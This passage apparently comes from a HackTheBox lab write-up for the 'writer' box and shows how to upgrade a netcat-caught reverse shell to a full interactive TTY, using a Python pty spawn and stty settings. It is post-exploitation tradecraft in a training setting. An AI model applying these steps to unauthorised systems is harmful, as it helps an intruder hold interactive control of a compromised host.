# Upgrade Shell

Once connected to our target the first job is to upgrade our terminal to something more useable.

Check if Python is available:

```
www-data@writer:/$ which python
which python
www-data@writer:/$ which python3
which python3
/usr/bin/python3
```

Spawn proper session:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Ctrl+Z to background then get host stty size and terminal:

```
www-data@writer:/$ ^Z
zsh: suspended  nc -nlvp 1337

┌──(root💀kali)-[~/htb/writer]
└─# stty size          
52 237

┌──(root💀kali)-[~/htb/writer]
└─# echo $TERM                                                            
xterm-256color
```

Then bring session to box back to foreground and apply settings:

```
┌──(root💀kali)-[~/htb/writer]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337

www-data@writer:/$ export TERM=xterm
www-data@writer:/$ stty rows 52 cols 237
```
